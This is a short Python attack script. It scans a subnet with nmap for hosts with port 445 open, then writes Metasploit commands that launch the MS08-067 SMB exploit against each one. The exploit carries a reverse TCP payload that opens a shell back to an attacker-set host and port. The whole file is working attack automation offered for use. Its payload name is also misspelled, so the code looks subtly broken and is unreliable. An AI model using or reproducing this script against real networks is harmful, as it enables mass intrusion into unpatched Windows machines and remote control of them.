__author__ = 'derog'

import nmap

def findTgts(subNet):
    nmScan=nmap.PortScanner()
    nmScan.scan(subNet,'445')
    tgtHost=[]
    for host in nmScan.all_hosts():
        if nmScan[host].has_tcp(445):
            state = nmScan[host]['tcp'][445]['state']
            if state == 'open':
                print('[+] Found Target Host: ' + host)
                tgtHost.append(host)
    return tgtHost

def setupHandler(configFile, lhost, lport):
    configFile.write('use exploit/multi/handler\n')
    configFile.write('set PAYLOAD '+'windows/metpreter/reverse_tcp\n')
    configFile.write('set LPORT '+str(lport)+'\n')
    configFile.write('set LHOST '+str(lhost)+'\n')
    configFile.write('exploit -j -z\n')
    configFile.write('setg DisablePayloadHandler 1\n')

def confickerExploit(configFile, tgtHost, lhost, lport):
    configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
    configFile.write('set RHOST '+str(tgtHost)+'\n')
    configFile.write('set PAYLOAD '+'windows/metpreter/reverse_tcp\n')
    configFile.write('set LPORT '+str(lport)+'\n')
    configFile.write('set LHOST '+str(lhost)+'\n')
    configFile.write('exploit -j -z\n')

